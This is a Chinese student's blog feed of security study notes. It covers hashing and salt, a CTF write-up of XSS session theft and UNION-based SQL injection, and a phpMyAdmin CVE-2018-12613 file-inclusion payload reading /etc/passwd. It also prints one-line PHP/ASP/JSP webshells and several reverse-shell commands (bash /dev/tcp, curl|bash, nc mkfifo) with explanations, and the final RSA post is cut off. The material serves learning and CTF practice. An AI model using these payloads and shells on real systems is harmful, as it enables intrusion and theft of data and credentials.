title="hash"></a>hash</h2><p>哈希算法也成为散列算法，可以通过哈希算法单向求得某值。理想情况下，可以正向快速求得该值，并且不能通过该值还原出原数据；原数据即使变化很小，得到的数据变化也比较大。<br>哈希算法可用来验证传输过程中数据是否被篡改。<br>hash算法不理想的情况：存在冲突。即多个原始数据对应一个目标值：h(a)=h(b)=k。在数学上函数必然可逆，且hash函数值域有限，比如128bitMD5的值域为2<sup>128</sup>=16<sup>32</sup>(第一次我竟然算错了2333 ,2exp28和32exp16怎么也对不上。我太菜了)<br>哈希算法常见的有：MD5 SHA-1(Secure Hash Algorithm,SHA) SHA-2* SHA512。目前MD5,SHA-1已经不安全。<br>这样可能会导致一些问题，比如在分发session的时候如果用hash计算，如果两用户session值相同的话，会导致越权操作。<br>MD5的长度为128bit，sha1长度为160bit，sha256为256bit,sha512为512bit。</p><h3 id="hash冲突处理方法"><a href="#hash冲突处理方法" class="headerlink" title="hash冲突处理方法"></a>hash冲突处理方法</h3><p>MD5算出来啥就是啥，不知道是不是冲突，此处讨论的冲突是存放的时候的冲突处理！</p><h4 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h4><h5 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h5><h5 id="线性补偿探测法"><a href="#线性补偿探测法" class="headerlink" title="线性补偿探测法"></a>线性补偿探测法</h5><h5 id="线性随机法"><a href="#线性随机法" class="headerlink" title="线性随机法"></a>线性随机法</h5><h4 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a>拉链法</h4><h4 id="多次hash"><a href="#多次hash" class="headerlink" title="多次hash"></a>多次hash</h4><h4 id="设立公共溢出区"><a href="#设立公共溢出区" class="headerlink" title="设立公共溢出区"></a>设立公共溢出区</h4><h2 id="幻数与内存存储方式"><a href="#幻数与内存存储方式" class="headerlink" title="幻数与内存存储方式"></a>幻数与内存存储方式</h2><p>其实内存存储方式是大一学的。。还是比较感谢王老师。。虽然老念ppt，但是问问题还是很热心的帮我解决。谢谢谢谢<br>幻数就是常用的数。MD5的四个幻数ABCD分别是（hex）：<br>A: 01 23 45 67<br>B: 89 ab cd ef<br>C: fe dc ba 98<br>D: 76 54 32 10<br>计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。<br>大端字节序：高位字节在前，低位字节在后，这是人类读写数值的方法。<br>小端字节序：低位字节在前，高位字节在后，即以0x1122形式储存。<br>比如用大端字节序存0x01234567的话就是 01 23 45 67<br>小端的话就是 67 45 23 01</p><h2 id="生日攻击-amp-amp-彩虹表-amp-amp-salt"><a href="#生日攻击-amp-amp-彩虹表-amp-amp-salt" class="headerlink" title="生日攻击&amp;&amp;彩虹表&amp;&amp;salt"></a>生日攻击&amp;&amp;彩虹表&amp;&amp;salt</h2><p>生日问题：一个班级需要有多少人，才能保证每个同学的生日都不一样？<br>答案很出人意料。如果至少两个同学生日相同的概率不超过5%，那么这个班只能有7个人。事实上，一个23人的班级有50%的概率，至少两个同学生日相同；50人班级有97%的概率，70人的班级则是99.9%的概率。<br>由该问题引出的是取值空间与计算哈希值次数和碰撞概率的关系。数学推导我这就不写了。我数学比较菜，当时看了一会才看懂咋回事。。对不起孙老师<br>取值空间为365，70个人中至少两人生日重复的概率为99%。365就是取值空间，70就是哈希计算次数。<br>由生日攻击与哈希碰撞导出的问题是破解哈希值以及如何防御哈希破解。</p><h3 id="哈希值破解"><a href="#哈希值破解" class="headerlink" title="哈希值破解"></a>哈希值破解</h3><p>由于哈希函数是单向的，所以破解方式照理来说应该是暴力破解或者手动算字典的哈希值，建立一个一一对应的关系然后查表。<br>对应方法：1.暴力破解2.字典3.彩虹表<br>这里重点说一下彩虹表，彩虹表并不是单纯的原文-密文一一对应的形式。<br>彩虹表前身–散列链<br>设加密函数为H(X)，则散列链存在一个约简函数R(X)，其定义域和值域与H(X)相反。<br>对于散列链和彩虹表详细的计算过程我还没看太明白，请教完老师再来写。<br>现在已知的是彩虹表是一种中和的方式来破解哈希值。<br>当k越大时，破解时间就越长，但彩虹表所占用的空间就越小；<br>相反，k越小时，彩虹表本身就越大，相应的破解时间就越短。</p><h4 id="加salt抵抗彩虹表"><a href="#加salt抵抗彩虹表" class="headerlink" title="加salt抵抗彩虹表"></a>加salt抵抗彩虹表</h4><p>salt可以是一串随机数。<br>假设原文是abc，<br>不加salt加密后的数据为 DEF，加salt加密后的数据为GKD<br>彩虹表还原出DEF的概率相对加salt后的概率相对大一些。因为对GKD还原后的数据大概率就不是原数据abc了。<br>应用场景：<br>用户注册时：hash(password+salt)-&gt;DB,salt-&gt;DB<br>用户登录时 if(hash_in_db==hash(input_username+salt))<br>            return true;</p><h2 id="php-file-get-contents"><a href="#php-file-get-contents" class="headerlink" title="php file_get_contents()"></a>php file_get_contents()</h2><p>file_get_contents()方法把整个文件读入到字符串中。</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell是什么，shell是什么？<br>shell是用户与操作系统交互的工具、平台。webshell就是基于web的shell，可以用于网站管理等功能。<br>常见的webshell就是命令执行，比如php的 <?php @eval(_$GET['cmd']);?> 将这句话写入以PHP为后端的网站后，通过对该文件传参数<a href="http://www.tst.com/1.php?cmd=whoami">www.tst.com/1.php?cmd=whoami</a><br>相当于在shell中执行whoami。当然，也可以用一些webshell管理工具方便操作，比如菜刀，蚁剑。<br>asp一句话： &lt;%eval request(“x”)%&gt; &lt;%execute request(“MH”)%&gt;<br>jsp一句话：&lt;% Runtime.getRuntime().exec(request.getParameter(“shell”)); %&gt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200404学习笔记</title>
      <link href="2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="缅怀先烈，吾辈当自强。"><a href="#缅怀先烈，吾辈当自强。" class="headerlink" title="缅怀先烈，吾辈当自强。"></a>缅怀先烈，吾辈当自强。</h1><h2 id="CVE-2018-12613-phpmyadmin-LFI-amp-amp-buuoj-ezweb"><a href="#CVE-2018-12613-phpmyadmin-LFI-amp-amp-buuoj-ezweb" class="headerlink" title="CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )"></a>CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )</h2><p>参考链接：<a href="https://www.freebuf.com/vuls/176064.html">https://www.freebuf.com/vuls/176064.html</a><br>首先分析index.php:<br>在index.php 第56行，<br> <img src="http://cdn.polowong.top/static/images/126133.jpg"><br>传入的target参数需要满足四个条件：<br>1.是字符串<br>2.不能以index开头<br>3.不在黑名单内<br>4.通过checkPageValidity函数检验，即返回true<br>跟进checkPageValidity函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">           <span class="variable">$page</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">       <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">           <span class="variable">$_page</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数分析：如果传入的白名单为空的话，就去找goto_whitelist。<br>如果没有设置page或者page变量不是字符串 返回false。<br>如果page在白名单内，返回true<br> mb_strpos($page . ‘?’, ‘?’)获得page变量?前的长度 注意：’.’用来连接两个字符串<br> mb_substr 获得[start,end)长度的字符串。<br> 举例如下：<br> <img src="http://cdn.polowong.top/static/images/126134.jpg"><br> 继续分析。<br> 来到<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">      <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">          <span class="variable">$_page</span>,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><br> 将?两次urlencode编码后为%253f。进入php后会自动解码一次，变成%3f，然后再次解码，成功绕过检验。（不双重编码无法绕过的原因为:如果直接给一个?的话,在第一个截取验证中，php会把问号后面的东西当作参数，include的还是db_sql.php。）<br> 所以index.php中的INCLUDE变成了：<br> include db_sql.php%3f(由于php会把db_sql.php%3f当成目录，所以需要多加一个../来跨目录。）<br> payload:<a href="http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd">http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a><br> <img src="http://cdn.polowong.top/static/images/126135.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200402学习笔记</title>
      <link href="2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>今天下午做了一个动态规划的题 还没大弄明白，捞的不谈。等我下次看到这or 学习一段时间动态规划后再去做。</p><h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><p>今天做了一道ciscn 2019的题。很惭愧。<br>这道题是华东北赛区分区赛的一道web题，当时我没做出来，只做到了如何破解md5前六位的一步，而且是用别人写的脚本跑的。当时没做xss的部分，首先是过滤的问题，过滤的字符太多，当时没有想到怎么绕过，就没有继续做了….我太菜了。<br>今天在此整理一下该题的解题思路。<br>首先写一段xss代码，提交后把链接放到问题反馈那，用脚本跑一下md5前6位。这一步完成后会有一个bot模拟管理员，管理员访问后通过xss发送管理员的身份信息到接收平台。从接收平台获取到session后，使用管理员登录。<br>扫描后台发现admin.php<br>PHPSESSID修改后登录即可<br>首先用group by 判断列数，<br>然后找一下数据库名 -1  and 1=2 union select 1,2,database() from information_schema.schemata -&gt;数据库名 ciscn<br>根据数据库名找表（通过limit看有多少表、多少多少字段）-1  union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ -》找到表flag 然后limit 找其他的表，这里其他的表没啥用<br>根据表名找列-1  union select 1,2,column_name  from information_schema.columns where table_name =’flag’ -》找到列 flagg<br>根据列名查数据 -1  union select 1,2,flagg from flag 找到flag。<br>getflag。<br>彳亍。。就看看user表有啥把<br>-1  union select 1,2,table_name from information_schema.tables where table_schema=’ciscn’ limit 1,1 找到users表<br>-1  union select 1,2,column_name from information_schema.columns where table_name=’users’   找到USER字段 limit 1,1 找到CURRENT_CONNECTIONS，username，password字段<br>-1  union select 1,username,password from users limit  这句话应该就对应着这个查询框 select username,password from users where id=?<br>这道题就结束了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200331学习笔记</title>
      <link href="2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="浮生日记"><a href="#浮生日记" class="headerlink" title="浮生日记"></a>浮生日记</h1><p>2020.3.31 晴<br>今天又是菜鸡的一天，刷题入门题就不会，心态崩了<br>dp，一定拿下！</p><h2 id="c语言相关"><a href="#c语言相关" class="headerlink" title="c语言相关"></a>c语言相关</h2><p>参考链接：<br><a href="https://blog.csdn.net/danxibaoxxx/article/details/81236180">https://blog.csdn.net/danxibaoxxx/article/details/81236180</a><br><a href="https://blog.csdn.net/CV_Jason/article/details/85244813">https://blog.csdn.net/CV_Jason/article/details/85244813</a><br><a href="https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a><br><a href="https://blog.csdn.net/abaloon/article/details/8173552">https://blog.csdn.net/abaloon/article/details/8173552</a><br><a href="https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><h3 id="ld-amp-lf"><a href="#ld-amp-lf" class="headerlink" title="ld&amp;lf"></a>ld&amp;lf</h3><p>这涉及到了c语言的精度问题。<br>首先看常见数据类型的取值范围：<br>char -128 ~ +127 (1 Byte)<br>short -32767 ~ + 32768 (2 Bytes)<br>unsigned short 0 ~ 65536 (2 Bytes)<br>int -2147483648 ~ +2147483647 (4 Bytes)<br>unsigned int 0 ~ 4294967295 (4 Bytes)<br>long == int<br>long long -9223372036854775808 ~ +9223372036854775807 (8 Bytes)<br>double 1.7 * 10^308 (8 Bytes)<br>unsigned int 0～4294967295<br>long long的最大值：9223372036854775807<br>long long的最小值：-9223372036854775808<br>unsigned long long的最大值：1844674407370955161<br>__int64的最大值：9223372036854775807<br>__int64的最小值：-9223372036854775808<br>unsigned __int64的最大值：18446744073709551615<br>结论：<br>输入输出long long/double的时候需要用%ld/%lf</p><h3 id="存储形式"><a href="#存储形式" class="headerlink" title="存储形式"></a>存储形式</h3><p>存储形式参考第三个链接，需要注意的是阶码是怎么得来的，我一开始也想错了。</p><h3 id="补码表示范围"><a href="#补码表示范围" class="headerlink" title="补码表示范围"></a>补码表示范围</h3><p>为什么八位二进制补码的表示范围是-128 — +127？<br>首先明确第一位是符号位。<br>以下为原码表示：<br>正数： +0—+127<br>00000000—01111111<br>负数：-0 —-   -127<br>10000000 —-   11111111</p><hr><p>无符号数10000000代表128，在补码中本来应该是-0，由于一个数对应一个补码，所以-0的补码用来表示-128。这也解释了为什么8位二进制数可表示的范围是-128~127。<br><img src="/img/bin1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux&amp;shell&amp;反弹shell&amp;环境变量</title>
      <link href="2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"/>
      <url>2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<blockquote><p>近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。<br>本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；<br>跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环境变量以及如何用alias。</p></blockquote><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>linux shell、反弹shell、重定向、环境变量</p><h1 id="参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）"><a href="#参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）" class="headerlink" title="参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）"></a>参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）</h1><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a><br><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a><br><a href="http://www.linuxso.com/command/alias.html">http://www.linuxso.com/command/alias.html</a><br><a href="https://blog.csdn.net/revilwang/article/details/8374362">https://blog.csdn.net/revilwang/article/details/8374362</a><br><a href="https://blog.csdn.net/flw8840488/article/details/90513873">https://blog.csdn.net/flw8840488/article/details/90513873</a><br><a href="https://blog.csdn.net/lw305080/article/details/52054188">https://blog.csdn.net/lw305080/article/details/52054188</a><br><a href="https://www.runoob.com/linux/linux-system-contents.html">https://www.runoob.com/linux/linux-system-contents.html</a></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>如何理解shell？<br>shell是用户与Linux内核之间的一层“代理”，用户通过shell与Linux内核建立联系。shell是在内核基础上编写的应用程序。<br>当然，shell也支持编程，这里不展开讲解。</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>先说怎么反弹shell，再说反弹shell的原理。<br>首先攻击机上执行 nc -lvp 8888</p><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</p><h3 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h3><p>首先在公网vps 写好反弹shell的语句 保存到ip/bash<br>RCE: curl ip/bash |bash //   |是管道符，意思是将上一个的输出作为下一个的输入</p><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>受害机执行 nc -e /bin/sh ip port<br>如果nc版本不对的话可以这样：<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done</p><h2 id="理解反弹shell"><a href="#理解反弹shell" class="headerlink" title="理解反弹shell"></a>理解反弹shell</h2><ul><li>第一句：bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1<br>理解：将交互式bash的输出与错误输出重定向到/dev/tcp/ip/port 文件，并且将标准输入重定向到标准输出。<br>前面的&amp;&gt;代表将输出与错误输出都重定向到后面的文件，后面的0&amp;&gt;1代表将标准输入（文件操作符0）重定向到标准输出（文件操作符1）。注意，这里的&amp;代表了识别后面的1为文件操作符（代表标准输出），而不是“1”这个文件。<br>Linux操作系统把所有内容都抽象为文件，包括tcp连接。<br>示意图<img src="/img/dev1.jpg"><br>虚线表示了stdin 重定向到stdout，由于stdout已经重定向到了/dev/tcp/ip/port ，所以stdin也将重定向到/dev/tcp/ip/port。</li><li>第二句 RCE: curl ip/bash |bash //   |是管道符，意思是将上一个的输出作为下一个的输入<br>首先在公网vps上写一个文件，内容为bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 重命名为bash<br>然后再受害机上执行curl ip/bash | bash 意思就是说通过curl获取bash的html内容，并且作为下一个的输入。bash是Linux中的shell，用于用户和内核交互。相当于用户输入了bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</li><li>第三句 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f<br>相当于创建了一个管道/tmp/f ，错误输出重定向到标准输出，标准输出重定向到/tmp/f ,把cat /tmp/f的结果传给交互式shell执行，传给nc ip port。形成环路。<br>大佬解读：mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路<br>我的解读：其实后半段的意思就是把传进来的命令用/bash/sh 执行，然后把结果传给ip port,然后 ip port 发送的结果传给/tmp/f,然后cat tmp /f,然后shell执行….就这么套娃，交互式shell就成了。<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2>环境变量文件：</li><li>/etc/profile 全局用户，应用于所有的Shell。</li><li>/$HOME/.profile 当前用户，应用于所有的Shell。</li><li>/etc/bash_bashrc 全局用户，应用于Bash Shell。</li><li>~/.bashrc 局部当前，应用于Bash Sell。<br>写入/etc/profile文件<br>export $PATH:/dir/subdir<br><img src="/img/env1.jpg"><h3 id="环境变量解析过程"><a href="#环境变量解析过程" class="headerlink" title="环境变量解析过程"></a>环境变量解析过程</h3><h4 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h4>/etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,并从/etc/profile.d目录的配置文件中搜集shell的设置.<br>/etc/bashrc: 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.<h4 id="用户环境变量"><a href="#用户环境变量" class="headerlink" title="用户环境变量"></a>用户环境变量</h4>.bash_profile ：定义了用户的个人化路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。（在这个文件中有执行.bashrc的脚本）<br>.bashrc ：该文件包含专用于你的shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。例如你可以将用户自定义的alias或者自定义变量写到这个文件中。<br>.bash_history ：记录命令历史用的。<br>.bash_logout ：当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。<h3 id="用户切换与环境变量"><a href="#用户切换与环境变量" class="headerlink" title="用户切换与环境变量"></a>用户切换与环境变量</h3>大部分Linux发行版的默认账户是普通账户，而更改系统文件或者执行某些命令，需要root身份才能进行，这就需要从当前用户切换到root用户，Linux中切换用户的命令是su或su -<br>前者只是切换root身份，但shell环境仍然是普通用户的shell；<br>而后者连用户和shell环境一起切换成root身份了。只有切换了shell环境才不会出现PATH环境变量错误。su切换成root用户以后，pwd一下，发现工作目录仍然是普通用户的工作目录；而用su - 命令切换以后，工作目录变成root工作目录了。<h2 id="Linux文件目录"><a href="#Linux文件目录" class="headerlink" title="Linux文件目录"></a>Linux文件目录</h2><img src="/img/dir1.jpg"></li></ul><p>/bin：<br>bin是Binary的缩写, 这个目录存放着最经常使用的命令。</p><p>/boot：<br>这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</p><p>/dev ：<br>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</p><p>/etc：<br>这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p><p>/home：<br>用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</p><p>/lib：<br>这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</p><p>/lost+found：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p><p>/media：<br>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p><p>/mnt：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。</p><p>/opt：<br> 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p><p>/proc：<br>这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><p>/root：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</p><p>/sbin：<br>s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</p><p>/selinux：<br> 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p><p>/srv：<br> 该目录存放一些服务启动之后需要提取的数据。</p><p>/sys：</p><p> 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。</p><p>sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。<br>该文件系统是内核设备树的一个直观反映。</p><p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p><p>/tmp：<br>这个目录是用来存放一些临时文件的。</p><p>/usr：<br> 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p><p>/usr/bin：<br>系统用户使用的应用程序。</p><p>/usr/sbin：<br>超级用户使用的比较高级的管理程序和系统守护程序。</p><p>/usr/src：<br>内核源代码默认的放置目录。</p><p>/var：<br>这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p><p>/run：<br>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA Encryption</title>
      <link href="2020/03/27/RSA-AES-Encryption/"/>
      <url>2020/03/27/RSA-AES-Encryption/</url>
      
        <content type="html"><![CDATA[<h1 id="致敬、参考"><a href="#致敬、参考" class="headerlink" title="致敬、参考"></a>致敬、参考</h1><p><a href="https://blog.csdn.net/dbs1215/article/details/48953589">https://blog.csdn.net/dbs1215/article/details/48953589</a><br><a href="https://www.jianshu.com/p/0f9b72d691c2">https://www.jianshu.com/p/0f9b72d691c2</a><br><a href="https://blog.csdn.net/weixin_37490221/article/details/80823129">https://blog.csdn.net/weixin_37490221/article/details/80823129</a></p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="RSA基本概念"><a href="#RSA基本概念" class="headerlink" title="RSA基本概念"></a>RSA基本概念</h3><p>RSA是一种非对称加密算法。<br>当时学计算机网络的时候对对称、非对称的概念很模糊，总是记不清。前两天SSH登录尝试了RSA免密登录，结合之前问过的老师的相关内容，对RSA的整个过程有了一个大致的了解。<br>私钥一定只有自己知道才能保证安全！！<br>密文=(明文<sup>E</sup>)mod N<br>明文=(密文<sup>D</sup>)mod N<br>符号说明：<br>N：由两个质数p<em>q构成。<br>L：1&lt;L&lt;lcm(p-1,q-1) (p-1,q-1的最小公倍数)<br>E：1&lt;E&lt;L &amp;&amp; gcd(E,L)=1<br>D: 1&lt;D&lt;L &amp;&amp; E</em>D mod L=1 (这也印证了对E的定义中为什么E和L要互质)</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" 